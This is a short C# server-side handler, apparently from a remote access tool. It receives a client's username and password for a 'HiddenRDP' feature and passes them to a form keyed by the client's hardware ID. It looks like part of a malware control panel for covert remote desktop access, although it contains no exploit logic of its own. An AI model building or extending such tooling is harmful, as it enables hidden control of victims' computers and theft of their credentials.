using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerRDP
{
	public static void Read(Clients client, object[] objects)
	{
		if (objects == null || objects.Length < 3)
		{
			return;
		}
		string username = (string)objects[1];
		string password = (string)objects[2];
		FormRDP form = (FormRDP)Application.OpenForms["HiddenRDP:" + client.Hwid];
		if (form != null)
		{
			form.Invoke((MethodInvoker)delegate
			{
				form.Installed(username, password);
			});
		}
	}
}
